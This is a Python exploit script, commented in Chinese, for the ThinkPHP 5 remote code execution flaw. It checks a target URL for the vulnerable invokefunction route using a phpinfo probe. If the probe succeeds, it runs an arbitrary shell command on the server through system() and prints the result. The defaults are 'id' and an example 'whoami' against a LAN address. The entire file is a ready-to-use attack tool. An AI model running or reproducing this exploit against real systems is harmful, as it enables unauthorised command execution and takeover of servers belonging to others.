import argparse
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main(url, cmd):
    # 1.发请求
    check_url = fr"{url}?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    attack_url = f"{url}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
    try:
        check_response = requests.get(check_url, verify=False, timeout=5, allow_redirects=False)
        if check_response.status_code == 200 and "PHP Extension Build" in check_response.text:
            print(f"[+]{url} 存在远程代码执行漏洞")
            attack_response = requests.get(attack_url, verify=False, timeout=5, allow_redirects=False)
            print(f"正在对{url}执行{cmd}操作")
            print(attack_response.text)
        else:
            print(f"[-]{url} 不存在远程代码执行漏洞")
    except Exception:
        sys.exit(1)
        print(f"[-]{url} 请求失败")


def banner():
    banner = '''
  _______ _____  _____       _____   _____ ______ 
 |__   __|  __ \| ____|     |  __ \ / ____|  ____|
    | |  | |__) | |__ ______| |__) | |    | |__   
    | |  |  ___/|___ \______|  _  /| |    |  __|  
    | |  | |     ___) |     | | \ \| |____| |____ 
    |_|  |_|    |____/      |_|  \_\\_____|______|
                                                  
                                                  '''
    print(banner)
if __name__ == '__main__':
    banner()
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="thinkphp5 rce exp",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
        python3 5-rce-exp.py -u http://192.168.1.108 -c whoami
        '''))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="input a cmd",default="id")
    # 把参数的值解析到对象中
    args = parser.parse_args()

    main(args.url,args.cmd)